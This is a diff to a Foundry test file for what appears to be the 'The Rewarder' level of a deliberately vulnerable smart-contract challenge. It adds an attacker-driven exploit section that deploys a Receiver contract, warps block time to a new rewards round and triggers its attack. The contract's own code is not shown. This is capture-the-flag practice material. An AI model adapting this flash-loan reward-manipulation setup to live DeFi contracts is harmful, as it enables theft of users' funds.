@@ -9,6 +9,7 @@ import {TheRewarderPool} from "../../../src/Contracts/the-rewarder/TheRewarderPo
 import {RewardToken} from "../../../src/Contracts/the-rewarder/RewardToken.sol";
 import {AccountingToken} from "../../../src/Contracts/the-rewarder/AccountingToken.sol";
 import {FlashLoanerPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";
+import {Receiver} from "../../../src/Contracts/the-rewarder/Receiver.sol";
 
 contract TheRewarder is Test {
     uint256 internal constant TOKENS_IN_LENDER_POOL = 1_000_000e18;
@@ -88,22 +89,47 @@ contract TheRewarder is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+        Receiver receiver = new Receiver(
+            address(theRewarderPool),
+            address(dvt),
+            address(flashLoanerPool)
+        );
+        if (theRewarderPool.isNewRewardsRound()) {
+            receiver.attack();
+        } else {
+            uint256 timeLeft = theRewarderPool.lastRecordedSnapshotTimestamp() + 5 days - block.timestamp;
+            if (timeLeft > 5 days) {
+                vm.warp(block.timestamp + timeLeft - 5 days);
+                receiver.attack();
+            } else {
+                vm.warp(block.timestamp + timeLeft);
+                receiver.attack();
+            }
+        }
+        vm.warp(theRewarderPool.lastRecordedSnapshotTimestamp() + 5 days);
+
+        vm.stopPrank();
 
         /**
          * EXPLOIT END *
          */
+
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
     }
 
     function validation() internal {
         assertEq(theRewarderPool.roundNumber(), 3); // Only one round should have taken place
+        console.log("The number of elapsed rounds is %s (should be 3)", theRewarderPool.roundNumber());
+
         for (uint8 i; i < 4; i++) {
             // Users should get negligible rewards this round
             vm.prank(users[i]);
             theRewarderPool.distributeRewards();
             uint256 rewardPerUser = theRewarderPool.rewardToken().balanceOf(users[i]);
             uint256 delta = rewardPerUser - 25e18;
+            console.log("Checking for delta");
             assertLt(delta, 1e16);
         }
         // Rewards must have been issued to the attacker account
